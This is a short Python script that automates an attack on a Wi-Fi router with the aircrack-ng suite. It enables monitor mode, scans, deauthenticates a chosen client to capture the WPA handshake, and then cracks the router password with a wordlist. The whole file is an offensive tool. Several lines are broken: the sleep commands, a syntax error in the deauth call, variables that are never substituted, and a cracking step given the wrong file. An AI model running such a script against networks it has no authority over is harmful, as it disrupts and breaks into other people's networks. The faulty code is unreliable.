import os
import subprocess

print('Switching wifi to monitor mode')
os.system('sleep4')
os.system('clear')
subprocess.call(["airmon-ng", "stop", "wlp2s0"])
subprocess.call(["airmon-ng", "start", "wlp2s0"])
os.system("xterm -e 'airodump-ng -w /tmp/scan --output-format csv wlp2s0mon; read'")
##os.system("xterm -e 'airodump-ng wlp2s0mon; read'")

channel = raw_input('Please enter channal router is using: \n')
os.system('sleep2')
os.system('clear')
bssid = raw_input('Please enter host router BSSID: \n')
os.system('sleep2')
os.system('clear')
path = raw_input('Please enter path were handsake will be kept: \n')
os.system('sleep2')
os.system('clear')
station = raw_input('Please client bssid{station id}: \n')
os.system('sleep2')
os.system('clear')
number = raw_input('Please enter number of time death packet will be send{from 1 to 10}: \n')
os.system('sleep2')
os.system('clear')

print('Starting handsake process')
os.system('sleep4')
os.system('clear')

subprocess.call(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", path, "wlp2s0mon"])
os.system("xterm -e 'aireplay-ng -0 ("number") -a bssid -c station wlp2s0; read'")

path1 = raw_input('Please enter path were worldlist is kept for cracking router: ')
os.system('sleep2')
os.system('clear')
subprocess.call(["aircrack-ng", "-a", "2", "-b", bssid, "-w", path])
exit(0)
